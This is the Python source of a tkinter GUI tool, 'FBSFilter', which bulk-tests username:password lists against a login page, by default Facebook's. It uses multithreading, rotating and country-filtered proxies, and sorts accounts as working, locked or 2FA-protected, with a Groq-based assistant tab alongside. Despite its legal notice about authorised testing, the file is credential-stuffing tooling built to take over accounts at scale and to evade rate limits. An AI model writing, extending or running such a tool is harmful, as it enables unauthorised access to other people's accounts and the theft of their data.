#!/usr/bin/env python3
"""
FBSFilter – Advanced Credential & Proxy Filter Tool (GUI)
=========================================================
GUI application built with tkinter.

Tabs:
  1. Credential Checker  – load a credential file, check logins, view live stats
  2. Proxy Filter        – paste / load proxy lists, filter, test, save
  3. AI Assistant        – Groq-powered analysis (requires API key)
  4. Settings            – configure threads, timeout, target URL, etc.

On first launch a dialog asks for a Groq API key.
Skipping disables AI-only features but all other functions work normally.

LEGAL NOTICE
------------
This tool is intended solely for security research, penetration testing, and
account recovery on systems you own or have explicit written permission to test.
The authors assume no liability for misuse.
"""

import configparser
import json
import logging
import os
import queue
import sys
import threading
import time
import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext, ttk
from typing import Optional

# ---------------------------------------------------------------------------
# Optional dependency guard – must run even if some packages are missing
# ---------------------------------------------------------------------------

try:
    from utils.checker import CheckResult, CredentialChecker, Status, TargetConfig
    from utils.file_handler import CheckpointManager, CredentialReader, ResultWriter
    from utils.proxy_manager import ProxyManager
    from utils.proxy_filter import (
        ProxyEntry, filter_entries, parse_proxy_text,
        save_proxy_list, test_proxies_concurrent,
        ANONYMITY_LEVELS, PROXY_TYPES,
    )
    from utils.ai_filter import (
        init_groq, is_groq_ready, analyze_credentials,
        analyze_proxy_list, ai_suggest_filters,
    )
    _UTILS_OK = True
except ImportError as _import_err:
    _UTILS_OK = False
    _IMPORT_ERR_MSG = str(_import_err)

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler("fbsfilter_gui.log", encoding="utf-8")],
)
log = logging.getLogger("fbsfilter.gui")

# ---------------------------------------------------------------------------
# Colour palette (dark theme)
# ---------------------------------------------------------------------------

BG = "#1e1e2e"
BG2 = "#27273a"
BG3 = "#313145"
FG = "#cdd6f4"
ACCENT = "#89b4fa"
GREEN = "#a6e3a1"
RED = "#f38ba8"
YELLOW = "#f9e2af"
CYAN = "#89dceb"
FONT = ("Segoe UI", 10)
FONT_BOLD = ("Segoe UI", 10, "bold")
FONT_MONO = ("Consolas", 9)

# Timeout (seconds) used for non-blocking queue puts in the feeder thread.
# Small enough to respond to stop requests quickly without busy-looping.
_QUEUE_PUT_TIMEOUT = 0.2

# ---------------------------------------------------------------------------
# Helper – styled button
# ---------------------------------------------------------------------------

def _btn(parent, text, command, bg=ACCENT, fg=BG, **kw):
    return tk.Button(
        parent, text=text, command=command,
        bg=bg, fg=fg, font=FONT_BOLD,
        relief=tk.FLAT, padx=10, pady=4,
        activebackground=FG, activeforeground=BG,
        cursor="hand2", **kw,
    )


# ---------------------------------------------------------------------------
# API Key Dialog
# ---------------------------------------------------------------------------

class APIKeyDialog(tk.Toplevel):
    """Modal dialog that asks for the Groq API key on first launch."""

    def __init__(self, parent: tk.Tk):
        super().__init__(parent)
        self.title("Groq API Key Setup")
        self.resizable(False, False)
        self.configure(bg=BG)
        self.grab_set()
        self.result: Optional[str] = None

        # Icon / heading
        heading = tk.Label(
            self, text="🤖  AI Filter Setup",
            font=("Segoe UI", 14, "bold"),
            bg=BG, fg=ACCENT,
        )
        heading.pack(pady=(18, 4), padx=30)

        desc = tk.Label(
            self,
            text=(
                "Enter your Groq API key to enable AI-powered filtering.\n"
                "Get a free key at: https://console.groq.com/keys\n\n"
                "You can skip this step – normal mode works without a key.\n"
                "AI features can be enabled later from the AI Assistant tab."
            ),
            font=FONT, bg=BG, fg=FG, justify=tk.CENTER,
        )
        desc.pack(padx=30, pady=4)

        # Entry
        entry_frame = tk.Frame(self, bg=BG)
        entry_frame.pack(padx=30, pady=8, fill=tk.X)
        tk.Label(entry_frame, text="API Key:", font=FONT_BOLD, bg=BG, fg=FG).pack(side=tk.LEFT)
        self._entry = tk.Entry(
            entry_frame, show="•", font=FONT_MONO,
            bg=BG3, fg=FG, insertbackground=FG,
            relief=tk.FLAT, width=46,
        )
        self._entry.pack(side=tk.LEFT, padx=(8, 0), fill=tk.X, expand=True)

        # Buttons
        btn_frame = tk.Frame(self, bg=BG)
        btn_frame.pack(pady=(4, 18), padx=30)
        _btn(btn_frame, "✓  Connect", self._accept, bg=GREEN, fg=BG).pack(side=tk.LEFT, padx=6)
        _btn(btn_frame, "Skip →", self._skip, bg=BG3, fg=FG).pack(side=tk.LEFT, padx=6)

        self._entry.focus_set()
        self.bind("<Return>", lambda _e: self._accept())
        self.bind("<Escape>", lambda _e: self._skip())

        # Centre on parent
        self.update_idletasks()
        px = parent.winfo_x() + (parent.winfo_width() - self.winfo_width()) // 2
        py = parent.winfo_y() + (parent.winfo_height() - self.winfo_height()) // 2
        self.geometry(f"+{px}+{py}")

    def _accept(self):
        self.result = self._entry.get().strip()
        self.destroy()

    def _skip(self):
        self.result = None
        self.destroy()


# ---------------------------------------------------------------------------
# Credential Checker Tab
# ---------------------------------------------------------------------------

class CredentialTab(ttk.Frame):
    def __init__(self, parent, settings: dict):
        super().__init__(parent)
        self._settings = settings
        self._running = False
        self._stop_event = threading.Event()
        self._stats = {"processed": 0, "working": 0, "invalid": 0, "locked": 0, "2fa": 0, "errors": 0}
        self._lock = threading.Lock()
        self._build_ui()

    # -- UI ----------------------------------------------------------------

    def _build_ui(self):
        self.configure(style="Dark.TFrame")
        pad = {"padx": 10, "pady": 4}

        # Top controls
        ctrl = tk.Frame(self, bg=BG2)
        ctrl.pack(fill=tk.X, padx=10, pady=6)

        tk.Label(ctrl, text="Credential File:", font=FONT_BOLD, bg=BG2, fg=FG).grid(row=0, column=0, sticky=tk.W, **pad)
        self._input_var = tk.StringVar()
        tk.Entry(ctrl, textvariable=self._input_var, bg=BG3, fg=FG, insertbackground=FG,
                 font=FONT_MONO, relief=tk.FLAT, width=55).grid(row=0, column=1, sticky=tk.EW, **pad)
        _btn(ctrl, "Browse", self._browse_input).grid(row=0, column=2, padx=4)

        tk.Label(ctrl, text="Proxy File (opt.):", font=FONT_BOLD, bg=BG2, fg=FG).grid(row=1, column=0, sticky=tk.W, **pad)
        self._proxy_var = tk.StringVar()
        tk.Entry(ctrl, textvariable=self._proxy_var, bg=BG3, fg=FG, insertbackground=FG,
                 font=FONT_MONO, relief=tk.FLAT, width=55).grid(row=1, column=1, sticky=tk.EW, **pad)
        _btn(ctrl, "Browse", self._browse_proxy).grid(row=1, column=2, padx=4)

        # Country filter row
        tk.Label(ctrl, text="Country Filter (opt.):", font=FONT_BOLD, bg=BG2, fg=FG).grid(row=2, column=0, sticky=tk.W, **pad)
        country_inner = tk.Frame(ctrl, bg=BG2)
        country_inner.grid(row=2, column=1, columnspan=2, sticky=tk.EW, **pad)
        self._country_filter_var = tk.StringVar()
        tk.Entry(country_inner, textvariable=self._country_filter_var, bg=BG3, fg=FG,
                 insertbackground=FG, font=FONT_MONO, relief=tk.FLAT, width=20).pack(side=tk.LEFT)
        tk.Label(country_inner,
                 text="Comma-separated ISO codes, e.g. US,GB,SG  (filters proxy list by country — FBS is global, main hubs: SG, AU, EU)",
                 font=FONT, bg=BG2, fg=CYAN, wraplength=460, justify=tk.LEFT).pack(side=tk.LEFT, padx=8)

        # Threads / Timeout / Delimiter in a row
        row3 = tk.Frame(ctrl, bg=BG2)
        row3.grid(row=3, column=0, columnspan=3, sticky=tk.W, padx=10, pady=4)
        _ctrl_fields = [("Threads:", "_thr_var", "threads", "10", 5),
                        ("Timeout(s):", "_to_var", "timeout", "10", 5),
                        ("Delimiter:", "_delim_var", "delimiter", ":", 4)]
        for lbl, attr, key, default, w in _ctrl_fields:
            tk.Label(row3, text=lbl, font=FONT_BOLD, bg=BG2, fg=FG).pack(side=tk.LEFT, padx=(0, 2))
            var = tk.StringVar(value=str(self._settings.get(key, default)))
            setattr(self, attr, var)
            tk.Entry(row3, textvariable=var, bg=BG3, fg=FG, insertbackground=FG,
                     font=FONT, relief=tk.FLAT, width=w).pack(side=tk.LEFT, padx=(0, 12))

        ctrl.columnconfigure(1, weight=1)

        # Run / Stop / Reset buttons
        btn_row = tk.Frame(self, bg=BG)
        btn_row.pack(pady=4)
        self._run_btn = _btn(btn_row, "▶  Start Checking", self._start, bg=GREEN, fg=BG)
        self._run_btn.pack(side=tk.LEFT, padx=8)
        self._stop_btn = _btn(btn_row, "■  Stop", self._stop, bg=RED, fg=BG, state=tk.DISABLED)
        self._stop_btn.pack(side=tk.LEFT, padx=8)
        self._reset_btn = _btn(btn_row, "🔄  Reset", self._reset, bg=BG3, fg=FG)
        self._reset_btn.pack(side=tk.LEFT, padx=8)

        # Progress bar
        self._progress = ttk.Progressbar(self, mode="determinate", length=600)
        self._progress.pack(pady=4)
        self._progress_lbl = tk.Label(self, text="", font=FONT, bg=BG, fg=CYAN)
        self._progress_lbl.pack()

        # Stats row
        stats_row = tk.Frame(self, bg=BG)
        stats_row.pack(pady=2)
        self._stat_vars = {}
        for key, colour in [("processed", FG), ("working", GREEN), ("invalid", RED),
                             ("locked", YELLOW), ("2fa", CYAN), ("errors", FG)]:
            display = "2FA" if key == "2fa" else key.upper()
            lbl = tk.Label(stats_row, text=f"{display}: 0", font=FONT_BOLD, bg=BG, fg=colour)
            lbl.pack(side=tk.LEFT, padx=10)
            self._stat_vars[key] = lbl

        # Main content: log (left) + live response viewer (right) in a paned window
        pane = tk.PanedWindow(self, orient=tk.HORIZONTAL, bg=BG, sashwidth=6,
                              sashrelief=tk.RAISED, relief=tk.FLAT)
        pane.pack(fill=tk.BOTH, expand=True, padx=10, pady=4)

        # Left: Live Log
        log_frame = tk.Frame(pane, bg=BG)
        tk.Label(log_frame, text="Live Log", font=FONT_BOLD, bg=BG, fg=ACCENT).pack(anchor=tk.W)
        self._log_area = scrolledtext.ScrolledText(
            log_frame, font=FONT_MONO, bg=BG3, fg=FG, insertbackground=FG,
            state=tk.DISABLED, relief=tk.FLAT,
        )
        self._log_area.pack(fill=tk.BOTH, expand=True)
        pane.add(log_frame, minsize=300, stretch="always")

        # Right: Live Response Viewer
        resp_frame = tk.Frame(pane, bg=BG2)
        tk.Label(resp_frame, text="🔍  Live Response Viewer", font=FONT_BOLD, bg=BG2, fg=ACCENT).pack(anchor=tk.W, padx=6, pady=(4, 0))

        # Quick single-credential test section
        qtest_frame = tk.LabelFrame(resp_frame, text=" Quick Single Test ", font=FONT_BOLD,
                                     bg=BG2, fg=CYAN, labelanchor=tk.NW, bd=1, relief=tk.GROOVE)
        qtest_frame.pack(fill=tk.X, padx=6, pady=4)

        qt_row1 = tk.Frame(qtest_frame, bg=BG2)
        qt_row1.pack(fill=tk.X, padx=4, pady=2)
        tk.Label(qt_row1, text="User:", font=FONT_BOLD, bg=BG2, fg=FG, width=6, anchor=tk.E).pack(side=tk.LEFT)
        self._qt_user_var = tk.StringVar()
        tk.Entry(qt_row1, textvariable=self._qt_user_var, bg=BG3, fg=FG,
                 insertbackground=FG, font=FONT_MONO, relief=tk.FLAT, width=22).pack(side=tk.LEFT, padx=2)

        qt_row2 = tk.Frame(qtest_frame, bg=BG2)
        qt_row2.pack(fill=tk.X, padx=4, pady=2)
        tk.Label(qt_row2, text="Pass:", font=FONT_BOLD, bg=BG2, fg=FG, width=6, anchor=tk.E).pack(side=tk.LEFT)
        self._qt_pass_var = tk.StringVar()
        tk.Entry(qt_row2, textvariable=self._qt_pass_var, show="•", bg=BG3, fg=FG,
                 insertbackground=FG, font=FONT_MONO, relief=tk.FLAT, width=22).pack(side=tk.LEFT, padx=2)

        _btn(qtest_frame, "▶ Test Now", self._quick_test, bg=ACCENT, fg=BG).pack(pady=(2, 4))

        # Last result detail panel
        detail_frame = tk.LabelFrame(resp_frame, text=" Last Result Details ", font=FONT_BOLD,
                                      bg=BG2, fg=CYAN, labelanchor=tk.NW, bd=1, relief=tk.GROOVE)
        detail_frame.pack(fill=tk.BOTH, expand=True, padx=6, pady=4)

        for attr, label in [("_rv_status", "Status:"), ("_rv_user", "User:"),
                              ("_rv_url", "Final URL:"), ("_rv_detail", "Detail:")]:
            row = tk.Frame(detail_frame, bg=BG2)
            row.pack(fill=tk.X, padx=4, pady=1)
            tk.Label(row, text=label, font=FONT_BOLD, bg=BG2, fg=FG, width=10, anchor=tk.E).pack(side=tk.LEFT)
            lbl = tk.Label(row, text="–", font=FONT_MONO, bg=BG2, fg=CYAN,
                           anchor=tk.W, wraplength=240, justify=tk.LEFT)
            lbl.pack(side=tk.LEFT, padx=4, fill=tk.X, expand=True)
            setattr(self, attr, lbl)

        tk.Label(detail_frame, text="Response Snippet:", font=FONT_BOLD, bg=BG2, fg=FG).pack(anchor=tk.W, padx=4, pady=(4, 0))
        self._rv_body = scrolledtext.ScrolledText(
            detail_frame, font=FONT_MONO, bg=BG3, fg=FG, insertbackground=FG,
            state=tk.DISABLED, relief=tk.FLAT, height=8,
        )
        self._rv_body.pack(fill=tk.BOTH, expand=True, padx=4, pady=(0, 4))

        pane.add(resp_frame, minsize=260, stretch="never")

    # -- Callbacks ----------------------------------------------------------

    def _browse_input(self):
        path = filedialog.askopenfilename(title="Select credential file",
                                          filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if path:
            self._input_var.set(path)

    def _browse_proxy(self):
        path = filedialog.askopenfilename(title="Select proxy file",
                                          filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if path:
            self._proxy_var.set(path)

    def _log(self, msg: str, colour: str = FG):
        def _do():
            self._log_area.configure(state=tk.NORMAL)
            self._log_area.insert(tk.END, msg + "\n")
            self._log_area.see(tk.END)
            self._log_area.configure(state=tk.DISABLED)
        self.after(0, _do)

    def _update_stats(self):
        def _do():
            with self._lock:
                s = dict(self._stats)
            for key, lbl in self._stat_vars.items():
                display = "2FA" if key == "2fa" else key.upper()
                lbl.config(text=f"{display}: {s.get(key, 0)}")
        self.after(0, _do)

    def _update_response_viewer(self, result):
        """Update the right-side live response panel with the latest result."""
        colour_map = {
            "working": GREEN, "invalid": RED, "locked": YELLOW,
            "2fa": CYAN, "error": RED,
        }
        status_val = result.status.value
        colour = colour_map.get(status_val, FG)

        def _do():
            self._rv_status.config(text=status_val.upper(), fg=colour)
            self._rv_user.config(text=f"{result.username}:{result.password}")
            self._rv_url.config(text=result.response_url or "–")
            self._rv_detail.config(text=result.detail or "–")
            self._rv_body.configure(state=tk.NORMAL)
            self._rv_body.delete("1.0", tk.END)
            self._rv_body.insert(tk.END, result.response_body or "(no body captured)")
            self._rv_body.configure(state=tk.DISABLED)
        self.after(0, _do)

    def _start(self):
        if self._running:
            return
        input_file = self._input_var.get().strip()
        if not input_file or not os.path.isfile(input_file):
            messagebox.showerror("Error", "Please select a valid credential file.")
            return

        self._running = True
        self._stop_event.clear()
        self._stats = {"processed": 0, "working": 0, "invalid": 0, "locked": 0, "2fa": 0, "errors": 0}
        self._run_btn.config(state=tk.DISABLED)
        self._stop_btn.config(state=tk.NORMAL)
        self._reset_btn.config(state=tk.DISABLED)
        self._progress["value"] = 0

        threading.Thread(target=self._run_task, daemon=True).start()

    def _stop(self):
        self._stop_event.set()
        self._log("[INFO] Stop requested – draining workers…", YELLOW)

    def _reset(self):
        """Reset the checker to its initial state (clears log, stats, progress)."""
        if self._running:
            messagebox.showwarning("Running", "Please stop the checker before resetting.")
            return
        self._stop_event.clear()
        self._stats = {"processed": 0, "working": 0, "invalid": 0, "locked": 0, "2fa": 0, "errors": 0}
        for key, lbl in self._stat_vars.items():
            display = "2FA" if key == "2fa" else key.upper()
            lbl.config(text=f"{display}: 0")
        self._progress["value"] = 0
        self._progress_lbl.config(text="")
        self._log_area.configure(state=tk.NORMAL)
        self._log_area.delete("1.0", tk.END)
        self._log_area.configure(state=tk.DISABLED)
        self._rv_status.config(text="–", fg=CYAN)
        self._rv_user.config(text="–")
        self._rv_url.config(text="–")
        self._rv_detail.config(text="–")
        self._rv_body.configure(state=tk.NORMAL)
        self._rv_body.delete("1.0", tk.END)
        self._rv_body.configure(state=tk.DISABLED)
        self._run_btn.config(state=tk.NORMAL)
        self._stop_btn.config(state=tk.DISABLED)
        self._reset_btn.config(state=tk.NORMAL)

    def _quick_test(self):
        """Test a single credential manually and show the result in the response viewer."""
        username = self._qt_user_var.get().strip()
        password = self._qt_pass_var.get().strip()
        if not username or not password:
            messagebox.showwarning("Quick Test", "Enter both username and password to test.")
            return
        url = self._settings.get("target_url", "https://www.facebook.com/login.php")
        try:
            timeout = int(self._to_var.get())
        except ValueError:
            timeout = 10

        proxy_file = self._proxy_var.get().strip() or None
        proxy_manager: Optional[ProxyManager] = None
        if proxy_file and os.path.isfile(proxy_file):
            proxy_manager = ProxyManager(proxy_file=proxy_file)

        def _do():
            proxies = proxy_manager.get() if proxy_manager else None
            checker = CredentialChecker(target=TargetConfig(url=url), timeout=timeout, proxies=proxies)
            result = checker.check(username, password)
            self._update_response_viewer(result)
            colour_map = {
                "working": GREEN, "invalid": FG, "locked": YELLOW, "2fa": CYAN, "error": RED,
            }
            self._log(
                f"[QUICK TEST][{result.status.value.upper():8s}] {username}:{password}  – {result.detail}",
                colour_map.get(result.status.value, FG),
            )

        threading.Thread(target=_do, daemon=True).start()

    def _run_task(self):
        try:
            self._run_task_inner()
        except Exception as exc:
            self._log(f"[ERROR] {exc}", RED)
            log.exception("Checker task error")
        finally:
            self._running = False
            self.after(0, lambda: self._run_btn.config(state=tk.NORMAL))
            self.after(0, lambda: self._stop_btn.config(state=tk.DISABLED))
            self.after(0, lambda: self._reset_btn.config(state=tk.NORMAL))

    def _run_task_inner(self):
        input_file = self._input_var.get().strip()
        proxy_file = self._proxy_var.get().strip() or None
        try:
            threads = int(self._thr_var.get())
            timeout = int(self._to_var.get())
        except ValueError:
            threads, timeout = 10, 10
        delim = self._delim_var.get() or ":"
        url = self._settings.get("target_url", "https://www.facebook.com/login.php")

        reader = CredentialReader(input_file, delimiter=delim)
        total = reader.count_lines()
        self.after(0, lambda: self._progress.config(maximum=max(1, total)))
        self._log(f"[INFO] Loaded {total} credentials from {input_file}", CYAN)

        writer = ResultWriter()
        target = TargetConfig(url=url)

        proxy_manager: Optional[ProxyManager] = None
        if proxy_file and os.path.isfile(proxy_file):
            # Apply optional country filter to the proxy list
            cc_raw = self._country_filter_var.get().strip()
            cc_filter = [x.strip().upper() for x in cc_raw.split(",") if x.strip()] if cc_raw else []
            if cc_filter:
                try:
                    from utils.proxy_filter import parse_proxy_text, filter_entries, save_proxy_list
                    import tempfile
                    with open(proxy_file, "r", encoding="utf-8", errors="replace") as _fh:
                        raw_proxy_text = _fh.read()
                    all_proxies = parse_proxy_text(raw_proxy_text)
                    filtered_proxies = filter_entries(all_proxies, country_codes=cc_filter)
                    if filtered_proxies:
                        tmp_proxy = os.path.join(tempfile.gettempdir(), "fbsfilter_cc_filtered.txt")
                        save_proxy_list(filtered_proxies, tmp_proxy, fmt="url")
                        proxy_file = tmp_proxy
                        self._log(
                            f"[PROXY] Country filter {cc_filter}: {len(filtered_proxies)}/{len(all_proxies)} proxies kept",
                            YELLOW,
                        )
                    else:
                        self._log(f"[PROXY] Country filter {cc_filter} matched 0 proxies – using full list", RED)
                except Exception as _e:
                    self._log(f"[PROXY] Country filter error: {_e} – using full list", RED)

            proxy_manager = ProxyManager(proxy_file=proxy_file)
            if proxy_manager.count == 0:
                self._log("[PROXY] No valid proxies found – running without proxy", RED)
                proxy_manager = None
            else:
                self._log(f"[PROXY] {proxy_manager.count} proxies loaded", CYAN)

        task_queue: queue.Queue = queue.Queue(maxsize=threads * 4)
        start_time = time.time()

        def worker():
            while True:
                item = task_queue.get()
                if item is None:
                    task_queue.task_done()
                    break
                # When stop is requested: drain without processing so task_queue.join() completes
                if self._stop_event.is_set():
                    task_queue.task_done()
                    continue
                username, password = item
                proxies = proxy_manager.get() if proxy_manager else None
                checker = CredentialChecker(target=target, timeout=timeout, proxies=proxies)
                result = checker.check(username, password)
                category = result.status.value
                writer.write(category, username, password, result.detail)

                with self._lock:
                    self._stats["processed"] += 1
                    stat_key = category if category in self._stats else "errors"
                    self._stats[stat_key] += 1

                self._update_stats()
                self._update_response_viewer(result)
                colour_map = {
                    "working": GREEN, "invalid": FG, "locked": YELLOW,
                    "2fa": CYAN, "error": RED,
                }
                self._log(
                    f"[{result.status.value.upper():8s}] {username}:{password}",
                    colour_map.get(result.status.value, FG),
                )
                self.after(0, lambda: self._progress.step(1))
                task_queue.task_done()

        workers = []
        for _ in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            workers.append(t)

        for _username, _password in reader.stream():
            if self._stop_event.is_set():
                break
            # Non-blocking put with stop-check to avoid hanging the feeder thread
            while True:
                if self._stop_event.is_set():
                    break
                try:
                    task_queue.put((_username, _password), timeout=_QUEUE_PUT_TIMEOUT)
                    break
                except queue.Full:
                    continue

        # Send sentinel values; workers drain and exit cleanly
        for _ in workers:
            task_queue.put(None)

        task_queue.join()
        for t in workers:
            t.join()

        writer.close()
        elapsed = time.time() - start_time
        with self._lock:
            s = dict(self._stats)
        self._log(
            f"\n[DONE] {s['processed']} processed in {elapsed:.1f}s  "
            f"| Working: {s['working']}  Invalid: {s['invalid']}  "
            f"Locked: {s['locked']}  2FA: {s['2fa']}  Errors: {s['errors']}",
            GREEN,
        )


# ---------------------------------------------------------------------------
# Proxy Filter Tab
# ---------------------------------------------------------------------------

class ProxyFilterTab(ttk.Frame):
    def __init__(self, parent, app):
        super().__init__(parent)
        self._app = app
        self._entries: list = []
        self._filtered: list = []
        self._build_ui()

    def _build_ui(self):
        # Left: input + controls
        left = tk.Frame(self, bg=BG)
        left.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=6, pady=6)

        tk.Label(left, text="Paste / Load Proxy List", font=FONT_BOLD, bg=BG, fg=ACCENT).pack(anchor=tk.W)
        tk.Label(left, text="Supports any format: ip:port, protocol://ip:port, full dump from proxydb.net etc.",
                 font=FONT, bg=BG, fg=FG, wraplength=400, justify=tk.LEFT).pack(anchor=tk.W, pady=(0, 4))

        self._input_box = scrolledtext.ScrolledText(
            left, font=FONT_MONO, bg=BG3, fg=FG, insertbackground=FG, height=14, relief=tk.FLAT,
        )
        self._input_box.pack(fill=tk.BOTH, expand=True, pady=(0, 4))

        btn_row = tk.Frame(left, bg=BG)
        btn_row.pack(fill=tk.X, pady=2)
        _btn(btn_row, "📂 Load File", self._load_file).pack(side=tk.LEFT, padx=4)
        _btn(btn_row, "⚙ Parse", self._parse, bg=ACCENT, fg=BG).pack(side=tk.LEFT, padx=4)
        _btn(btn_row, "✨ AI Suggest Filters", self._ai_suggest, bg=YELLOW, fg=BG).pack(side=tk.LEFT, padx=4)
        _btn(btn_row, "🧹 Clear", self._clear_input, bg=BG3, fg=FG).pack(side=tk.LEFT, padx=4)

        # Right: filters + results
        right = tk.Frame(self, bg=BG2, bd=0)
        right.pack(side=tk.RIGHT, fill=tk.BOTH, padx=6, pady=6)

        tk.Label(right, text="Filters", font=FONT_BOLD, bg=BG2, fg=ACCENT).pack(anchor=tk.W, padx=8, pady=(4, 2))

        # Type filter
        tk.Label(right, text="Protocol Type:", font=FONT_BOLD, bg=BG2, fg=FG).pack(anchor=tk.W, padx=8)
        self._type_vars = {}
        type_row = tk.Frame(right, bg=BG2)
        type_row.pack(anchor=tk.W, padx=8, pady=2)
        for ptype in PROXY_TYPES:
            var = tk.BooleanVar(value=True)
            self._type_vars[ptype] = var
            tk.Checkbutton(type_row, text=ptype.upper(), variable=var,
                           bg=BG2, fg=FG, selectcolor=BG3, activebackground=BG2,
                           activeforeground=FG, font=FONT).pack(side=tk.LEFT, padx=4)

        # Anonymity filter
        tk.Label(right, text="Anonymity Level:", font=FONT_BOLD, bg=BG2, fg=FG).pack(anchor=tk.W, padx=8, pady=(4, 0))
        self._anon_vars = {}
        anon_row = tk.Frame(right, bg=BG2)
        anon_row.pack(anchor=tk.W, padx=8, pady=2)
        for level in list(ANONYMITY_LEVELS) + ["unknown"]:
            var = tk.BooleanVar(value=True)
            self._anon_vars[level] = var
            tk.Checkbutton(anon_row, text=level.capitalize(), variable=var,
                           bg=BG2, fg=FG, selectcolor=BG3, activebackground=BG2,
                           activeforeground=FG, font=FONT).pack(side=tk.LEFT, padx=4)

        # Country filter
        tk.Label(right, text="Country Codes (comma-separated, blank=all):",
                 font=FONT_BOLD, bg=BG2, fg=FG).pack(anchor=tk.W, padx=8, pady=(4, 0))
        self._country_var = tk.StringVar()
        tk.Entry(right, textvariable=self._country_var, bg=BG3, fg=FG, insertbackground=FG,
                 font=FONT_MONO, relief=tk.FLAT, width=28).pack(anchor=tk.W, padx=8, pady=2)

        # Test options
        test_row = tk.Frame(right, bg=BG2)
        test_row.pack(anchor=tk.W, padx=8, pady=4)
        self._test_var = tk.BooleanVar(value=False)
        tk.Checkbutton(test_row, text="Test proxies (live)", variable=self._test_var,
                       bg=BG2, fg=FG, selectcolor=BG3, activebackground=BG2,
                       activeforeground=FG, font=FONT_BOLD).pack(side=tk.LEFT)
        tk.Label(test_row, text="Timeout:", font=FONT, bg=BG2, fg=FG).pack(side=tk.LEFT, padx=(12, 4))
        self._test_timeout_var = tk.StringVar(value="8")
        tk.Entry(test_row, textvariable=self._test_timeout_var, bg=BG3, fg=FG,
                 font=FONT, relief=tk.FLAT, width=4).pack(side=tk.LEFT)
        tk.Label(test_row, text="Workers:", font=FONT, bg=BG2, fg=FG).pack(side=tk.LEFT, padx=(8, 4))
        self._test_workers_var = tk.StringVar(value="50")
        tk.Entry(test_row, textvariable=self._test_workers_var, bg=BG3, fg=FG,
                 font=FONT, relief=tk.FLAT, width=4).pack(side=tk.LEFT)

        # Working only
        self._working_only_var = tk.BooleanVar(value=False)
        tk.Checkbutton(right, text="Show working proxies only (after test)",
                       variable=self._working_only_var,
                       bg=BG2, fg=FG, selectcolor=BG3, activebackground=BG2,
                       activeforeground=FG, font=FONT).pack(anchor=tk.W, padx=8)

        _btn(right, "▶ Apply Filters & Test", self._apply_filters, bg=GREEN, fg=BG).pack(padx=8, pady=6)

        # Progress
        self._test_progress = ttk.Progressbar(right, mode="determinate", length=280)
        self._test_progress.pack(padx=8, pady=2)
        self._test_lbl = tk.Label(right, text="", font=FONT, bg=BG2, fg=CYAN)
        self._test_lbl.pack(padx=8)

        # Stats
        self._stats_lbl = tk.Label(right, text="Parsed: 0  |  Filtered: 0  |  Working: 0",
                                    font=FONT_BOLD, bg=BG2, fg=FG)
        self._stats_lbl.pack(padx=8, pady=4)

        # Output format
        fmt_row = tk.Frame(right, bg=BG2)
        fmt_row.pack(anchor=tk.W, padx=8, pady=2)
        tk.Label(fmt_row, text="Save format:", font=FONT_BOLD, bg=BG2, fg=FG).pack(side=tk.LEFT, padx=(0, 6))
        self._fmt_var = tk.StringVar(value="url")
        for val, txt in [("url", "URL"), ("hostport", "host:port"), ("csv", "CSV")]:
            tk.Radiobutton(fmt_row, text=txt, variable=self._fmt_var, value=val,
                           bg=BG2, fg=FG, selectcolor=BG3, activebackground=BG2,
                           activeforeground=FG, font=FONT).pack(side=tk.LEFT, padx=4)

        save_row = tk.Frame(right, bg=BG2)
        save_row.pack(anchor=tk.W, padx=8, pady=4)
        _btn(save_row, "💾 Save Filtered", self._save_filtered, bg=ACCENT, fg=BG).pack(side=tk.LEFT, padx=4)
        _btn(save_row, "→ Use as Proxy File", self._use_as_proxy, bg=YELLOW, fg=BG).pack(side=tk.LEFT, padx=4)

        # Result list
        tk.Label(right, text="Filtered Proxies", font=FONT_BOLD, bg=BG2, fg=ACCENT).pack(anchor=tk.W, padx=8)
        list_frame = tk.Frame(right, bg=BG2)
        list_frame.pack(fill=tk.BOTH, expand=True, padx=8, pady=4)
        cols = ("url", "type", "anon", "country", "latency")
        self._tree = ttk.Treeview(list_frame, columns=cols, show="headings", height=10)
        for col, w in zip(cols, (200, 60, 90, 60, 70)):
            self._tree.heading(col, text=col.capitalize())
            self._tree.column(col, width=w, anchor=tk.W)
        scroll = ttk.Scrollbar(list_frame, orient=tk.VERTICAL, command=self._tree.yview)
        self._tree.configure(yscrollcommand=scroll.set)
        self._tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scroll.pack(side=tk.RIGHT, fill=tk.Y)

    # -- Callbacks ----------------------------------------------------------

    def _load_file(self):
        path = filedialog.askopenfilename(title="Load proxy list",
                                          filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if path:
            try:
                with open(path, "r", encoding="utf-8", errors="replace") as fh:
                    self._input_box.delete("1.0", tk.END)
                    self._input_box.insert("1.0", fh.read())
            except OSError as exc:
                messagebox.showerror("Error", str(exc))

    def _clear_input(self):
        self._input_box.delete("1.0", tk.END)

    def _parse(self):
        text = self._input_box.get("1.0", tk.END)
        self._entries = parse_proxy_text(text)
        self._filtered = list(self._entries)
        self._refresh_tree(self._filtered)
        self._stats_lbl.config(text=f"Parsed: {len(self._entries)}  |  Filtered: {len(self._filtered)}  |  Working: –")

    def _ai_suggest(self):
        if not is_groq_ready():
            messagebox.showinfo("AI Not Available",
                                "Enter a Groq API key in the AI Assistant tab first.")
            return
        text = self._input_box.get("1.0", tk.END).strip()
        if not text:
            messagebox.showinfo("Empty", "Paste a proxy list first.")
            return

        def _do():
            try:
                suggestions = ai_suggest_filters(text)
                types = suggestions.get("types", [])
                anon = suggestions.get("anonymity", [])
                cc = suggestions.get("country_codes", [])

                def _apply():
                    for k, v in self._type_vars.items():
                        v.set(not types or k in types)
                    for k, v in self._anon_vars.items():
                        v.set(not anon or k in anon)
                    self._country_var.set(",".join(cc))
                    messagebox.showinfo("AI Suggestion Applied",
                                        f"Types: {types or 'all'}\nAnonymity: {anon or 'all'}\n"
                                        f"Countries: {cc or 'all'}")
                self.after(0, _apply)
            except Exception as exc:
                self.after(0, lambda: messagebox.showerror("AI Error", str(exc)))

        threading.Thread(target=_do, daemon=True).start()

